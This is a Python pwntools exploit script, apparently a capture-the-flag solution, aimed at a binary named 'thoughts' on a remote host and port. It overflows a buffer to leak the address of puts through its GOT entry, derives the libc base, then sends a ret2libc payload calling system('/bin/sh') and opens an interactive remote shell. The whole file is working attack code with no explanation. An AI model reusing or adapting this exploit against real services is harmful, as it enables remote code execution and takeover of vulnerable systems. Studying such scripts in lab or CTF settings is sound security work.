#!/usr/bin/env python


from pwn import * 
e = ELF("./thoughts")
libc = ELF("./libc_thoughts.so.6")
r = remote("157.230.33.195",1111)
r.recv()
good = b"1"
bad = b"2"
r.sendline(good)
libc_leaker= b"C" * 10 + b"D" * 2 + p32(e.plt['puts']) + p32(e.symbols['main']) + p32(e.got['puts']) 
r.sendline(libc_leaker)
r.recvline()
r.sendline(bad)
padding = b"B" * 32
r.sendline(padding)
r.recv()
r.recvline()
r.recvline()
address = u32(r.recvuntil(b"\xf7").decode("latin-1").ljust(4,"\x00"))
log.info("The leaked libc address is " + hex(address))
libc_base = address - libc.symbols['puts']
log.info("The base address is " + hex(libc_base))
r.recvline()
r.recv()
r.sendline(b"1")
rop = ROP(e)
ret = rop.find_gadget(['ret'])[0]
system = libc_base + 284720
bin_sh = libc_base + 1647442 
log.info("The address of system function is " + hex(system))
log.info("The address of strings /bin/sh is " + hex(bin_sh))
exploit = b"C" * 10 + b"D" * 2 + p32(system) + b"AAAA" + p32(bin_sh)
r.sendline(exploit)
r.recvline()
r.sendline(b"2")
padding = b"B" * 32
r.recv()
r.sendline(padding)
r.recv()
r.interactive()
r.close()
